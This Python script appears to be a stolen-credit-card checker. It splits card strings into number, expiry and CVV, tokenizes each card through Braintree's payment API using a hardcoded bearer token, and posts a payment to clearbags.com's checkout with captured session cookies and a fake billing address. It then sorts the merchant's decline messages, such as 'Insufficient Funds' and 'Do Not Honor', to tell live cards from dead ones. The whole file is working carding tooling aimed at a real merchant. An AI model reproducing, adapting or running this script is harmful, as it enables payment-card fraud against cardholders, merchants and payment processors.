import requests
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	import requests
	
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTI4ODQyMTAsImp0aSI6IjczYzYxNDlkLTNlNzUtNDdmOC04YjljLTE0ODc4MmY2NzFhNCIsInN1YiI6Im05cGZ5OXE2ZGY3Nm10ZzYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im05cGZ5OXE2ZGY3Nm10ZzYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.Hzh4nRcCp5vX_v5theLRrjepha7_frvnd5bltutwGok5FCh-cam3Z6JVC26UCreHnuHvfeeifnVkXni9j1TwMA',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}
	
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'daee1e9a-59e9-4f90-ad76-e4bc1cc9c361',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': f'{n}',
                'expirationMonth': f'{mm}',
                'expirationYear': f'{yy}',
                'cvv': f'{cvc}',
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	token = (response.json()['data']['tokenizeCreditCard']['token'])
	cookies = {
    'ssUserId': 'c84e9daf-ccac-47f8-b66d-23a68f656f78',
    '_isuid': 'c84e9daf-ccac-47f8-b66d-23a68f656f78',
    '_gcl_au': '1.1.498882403.1692692389',
    '_gid': 'GA1.2.1870600961.1692692390',
    'rmStore': 'dmid:10132',
    '_fbp': 'fb.1.1692692390062.1123143325',
    '_pin_unauth': 'dWlkPU9UQXhNakV6TlRjdE5EYzNaaTAwWVRRd0xXSXhNemd0WkdNNFpEWTNOamMyT1daaA',
    'drift_aid': '2b438165-ce18-465d-9531-cb0a181f42d7',
    'driftt_aid': '2b438165-ce18-465d-9531-cb0a181f42d7',
    'datadome': '45j4Je3xSHz4iZZOvHzQ5CAitJGjFjO2WKKHevuv8EAg6JhBreRk8MTFoybDU3M01t7IgLefZspvGuphgtztQdWWUGip-Bm_B_1OaFMdcaDRH-FclfE3VK7RD_QVeJaP',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-banners-cache-storage': '{}',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    '_clck': '18chsxk|2|fee|0|1330',
    'form_key': 'imyrSbLDmbs7wlGT',
    '_clsk': 'ee2e68|1692812857643|2|1|v.clarity.ms/collect',
    'drift_campaign_refresh': 'a1a3ead0-2e82-45bc-b09e-ef2a057fe49c',
    'mage-messages': '',
    'form_key': 'imyrSbLDmbs7wlGT',
    'X-Magento-Vary': '9bf9a599123e6402b85cde67144717a08b817412',
    'mage-cache-sessid': 'true',
    'PHPSESSID': '0d2ifbt5alr3cqu773qkdjvjer',
    'pixlee_analytics_cookie_legacy': '%7B%22CURRENT_PIXLEE_USER_ID%22%3A%22f20bbeb8-e9f4-562c-1d9a-735a539b3997%22%2C%22TIME_SPENT%22%3A3%2C%22BOUNCED%22%3Afalse%7D',
    'ssCartProducts': 'GC12X9',
    'cf_chl_2': 'cf1dfb748114dfa',
    'cf_clearance': '2OgjN57orxCDKqFZOa5B3OrpsRYYNhq2eZcsrynQNnE-1692815183-0-1-7c0b3fed.170a79f9.2b0a600d-150.0.0',
    'ssSessionIdNamespace': '660dd0a8-4edd-48ce-8ce6-1ac0225af793',
    '__kla_id': 'eyIkcmVmZXJyZXIiOnsidHMiOjE2OTI2OTIzODYsInZhbHVlIjoiaHR0cHM6Ly93d3cuY2xlYXJiYWdzLmNvbS9jaGVja291dC8/X19jZl9jaGxfdGs9Q3l0R1hudWxNVjlkX2JWenVySy56cWlRY2c3T1FRWm83anlGUnB5b1NXSS0xNjkyNjkyMzczLTAtZ2FOeWNHek5ESHMiLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cuY2xlYXJiYWdzLmNvbS9jaGVja291dC9jYXJ0LyNwYXltZW50In0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjkyODE1NDMxLCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5jbGVhcmJhZ3MuY29tLyJ9LCIkc291cmNlIjoiSG9tZXBhZ2UgZW1haWwgc2lnbnVwIiwiJGV4Y2hhbmdlX2lkIjoiSzN5a1FEd1hGVTNkcWN5VTVoUDgtU1VTR01nSEN5bk1ENGZoYVhTMzRYOHZRWGFZb2ltZjJvdWlQODVfUlppVkhjOTZaOXRtQzhIcU9FZlN3d1pEOHc9PS5NelJlOHkifQ==',
    '_dc_gtm_UA-1909052-1': '1',
    '_ga': 'GA1.1.961836316.1692692389',
    '_ga_P6ZBHWHSDG': 'GS1.1.1692812694.12.1.1692815432.48.0.0',
    '_uetsid': 'a95f550040c411ee9f43215792b75efe',
    '_uetvid': 'a96056d040c411eebe73a15ff60a070f',
    'private_content_version': '60cfcce3e79898c1cb3b712f24cc24b8',
    'section_data_ids': '{%22cart%22:1692815416%2C%22wishlist%22:1692815183%2C%22directory-data%22:1692815183%2C%22company%22:1692815435%2C%22customer-data-form%22:1692815435%2C%22captcha%22:1692815416%2C%22customer%22:1692815183%2C%22compare-products%22:1692815183%2C%22last-ordered-items%22:1692815416%2C%22requisition%22:1692815183%2C%22company_authorization%22:1692815183%2C%22negotiable_quote%22:1692815183%2C%22instant-purchase%22:1692815416%2C%22loggedAsCustomer%22:1692815183%2C%22multiplewishlist%22:1692815183%2C%22purchase_order%22:1692815183%2C%22persistent%22:1692815183%2C%22review%22:1692815183%2C%22recently_viewed_product%22:1692815183%2C%22recently_compared_product%22:1692815183%2C%22product_data_storage%22:1692815183%2C%22paypal-billing-agreement%22:1692815183%2C%22messages%22:1692815435}',
}
	
	headers = {
    'authority': 'www.clearbags.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    # 'cookie': 'ssUserId=c84e9daf-ccac-47f8-b66d-23a68f656f78; _isuid=c84e9daf-ccac-47f8-b66d-23a68f656f78; _gcl_au=1.1.498882403.1692692389; _gid=GA1.2.1870600961.1692692390; rmStore=dmid:10132; _fbp=fb.1.1692692390062.1123143325; _pin_unauth=dWlkPU9UQXhNakV6TlRjdE5EYzNaaTAwWVRRd0xXSXhNemd0WkdNNFpEWTNOamMyT1daaA; drift_aid=2b438165-ce18-465d-9531-cb0a181f42d7; driftt_aid=2b438165-ce18-465d-9531-cb0a181f42d7; datadome=45j4Je3xSHz4iZZOvHzQ5CAitJGjFjO2WKKHevuv8EAg6JhBreRk8MTFoybDU3M01t7IgLefZspvGuphgtztQdWWUGip-Bm_B_1OaFMdcaDRH-FclfE3VK7RD_QVeJaP; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-banners-cache-storage={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _clck=18chsxk|2|fee|0|1330; form_key=imyrSbLDmbs7wlGT; _clsk=ee2e68|1692812857643|2|1|v.clarity.ms/collect; drift_campaign_refresh=a1a3ead0-2e82-45bc-b09e-ef2a057fe49c; mage-messages=; form_key=imyrSbLDmbs7wlGT; X-Magento-Vary=9bf9a599123e6402b85cde67144717a08b817412; mage-cache-sessid=true; PHPSESSID=0d2ifbt5alr3cqu773qkdjvjer; pixlee_analytics_cookie_legacy=%7B%22CURRENT_PIXLEE_USER_ID%22%3A%22f20bbeb8-e9f4-562c-1d9a-735a539b3997%22%2C%22TIME_SPENT%22%3A3%2C%22BOUNCED%22%3Afalse%7D; ssCartProducts=GC12X9; cf_chl_2=cf1dfb748114dfa; cf_clearance=2OgjN57orxCDKqFZOa5B3OrpsRYYNhq2eZcsrynQNnE-1692815183-0-1-7c0b3fed.170a79f9.2b0a600d-150.0.0; ssSessionIdNamespace=660dd0a8-4edd-48ce-8ce6-1ac0225af793; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2OTI2OTIzODYsInZhbHVlIjoiaHR0cHM6Ly93d3cuY2xlYXJiYWdzLmNvbS9jaGVja291dC8/X19jZl9jaGxfdGs9Q3l0R1hudWxNVjlkX2JWenVySy56cWlRY2c3T1FRWm83anlGUnB5b1NXSS0xNjkyNjkyMzczLTAtZ2FOeWNHek5ESHMiLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cuY2xlYXJiYWdzLmNvbS9jaGVja291dC9jYXJ0LyNwYXltZW50In0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjkyODE1NDMxLCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5jbGVhcmJhZ3MuY29tLyJ9LCIkc291cmNlIjoiSG9tZXBhZ2UgZW1haWwgc2lnbnVwIiwiJGV4Y2hhbmdlX2lkIjoiSzN5a1FEd1hGVTNkcWN5VTVoUDgtU1VTR01nSEN5bk1ENGZoYVhTMzRYOHZRWGFZb2ltZjJvdWlQODVfUlppVkhjOTZaOXRtQzhIcU9FZlN3d1pEOHc9PS5NelJlOHkifQ==; _dc_gtm_UA-1909052-1=1; _ga=GA1.1.961836316.1692692389; _ga_P6ZBHWHSDG=GS1.1.1692812694.12.1.1692815432.48.0.0; _uetsid=a95f550040c411ee9f43215792b75efe; _uetvid=a96056d040c411eebe73a15ff60a070f; private_content_version=60cfcce3e79898c1cb3b712f24cc24b8; section_data_ids={%22cart%22:1692815416%2C%22wishlist%22:1692815183%2C%22directory-data%22:1692815183%2C%22company%22:1692815435%2C%22customer-data-form%22:1692815435%2C%22captcha%22:1692815416%2C%22customer%22:1692815183%2C%22compare-products%22:1692815183%2C%22last-ordered-items%22:1692815416%2C%22requisition%22:1692815183%2C%22company_authorization%22:1692815183%2C%22negotiable_quote%22:1692815183%2C%22instant-purchase%22:1692815416%2C%22loggedAsCustomer%22:1692815183%2C%22multiplewishlist%22:1692815183%2C%22purchase_order%22:1692815183%2C%22persistent%22:1692815183%2C%22review%22:1692815183%2C%22recently_viewed_product%22:1692815183%2C%22recently_compared_product%22:1692815183%2C%22product_data_storage%22:1692815183%2C%22paypal-billing-agreement%22:1692815183%2C%22messages%22:1692815435}',
    'origin': 'https://www.clearbags.com',
    'referer': 'https://www.clearbags.com/checkout/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	json_data = {
    'cartId': '3514026',
    'billingAddress': {
        'customerAddressId': '468365',
        'countryId': 'EG',
        'regionCode': 'Michigan',
        'region': 'Michigan',
        'customerId': '697660',
        'street': [
            '2583 Woodbridge Lane',
            'So hxxjxj',
        ],
        'company': 'Sgsgg',
        'telephone': '3135101571',
        'fax': None,
        'postcode': '48302',
        'city': 'Bloomfield Township',
        'firstname': 'Adjxhf',
        'lastname': 'Djdjxx',
        'middlename': None,
        'prefix': None,
        'suffix': None,
        'vatId': None,
        'customAttributes': [
            {
                'attribute_code': 'validation_status',
                'value': 'COUNTRY_NOT_SUPPORTED',
            },
        ],
        'saveInAddressBook': None,
    },
    'paymentMethod': {
        'method': 'braintree',
        'additional_data': {
            'payment_method_nonce': token,
            'device_data': '{"correlation_id":"6b73444bfe9b06c3d59f66b46d23deec"}',
        },
    },
}
	response = requests.post(
    'https://www.clearbags.com/rest/default/V1/carts/mine/payment-information',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Insufficient Funds" in ii:
			return 'Insufficient Funds'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Cannot Authorize at this time (Policy)" in ii:
			return 'Cannot Authorize at this time (Policy)'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Do Not Honor" in ii:
			return 'Do Not Honor'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. No Account" in ii:
			return 'No Account'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Call Issuer. Pick Up Card." in ii:
			return 'Call Issuer. Pick Up Card'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Declined - Call Issuer" in ii:
			return 'Declined - Call Issuer'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Processor Declined - Fraud Suspected" in ii:
			return 'Processor Declined - Fraud Suspected'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Transaction Not Allowed" in ii:
			return 'Transaction Not Allowed'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Processor Declined" in ii:
			return 'Processor Declined'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Closed Card" in ii:
			return 'Closed Card'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Expired Card" in ii:
			return 'Expired Card'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Card Not Activated" in ii:
			return 'Card Not Activated'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Card Issuer Declined CVV" in ii:
			return 'Card Issuer Declined CVV'
	except:
   	 print(response.json()['message'])
   	 return ii
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Invalid postal code and cvv" in ii:
			return 'Invalid postal code and cvv'
	except:
   	 print(response.json()['message'])
   	 return ii 
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Credit card type is not accepted by this merchant account." in ii:
			return 'Credit card type is not accepted by this merchant account.'
	except:
   	 print(response.json()['message'])
   	 return ii 
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. No Such Issuer" in ii:
			return 'No Such Issuer'
	except:
   	 print(response.json()['message'])
   	 return ii 
   	 
	try:
		ii=(response.json()['message'])
		if "Your payment could not be taken. Please try again or use a different payment method. Gateway Rejected: risk_threshold" in ii:
			return 'risk_threshold'
	except:
   	 print(response.json()['message'])
   	 return ii 
   	 
   	 print(response.json())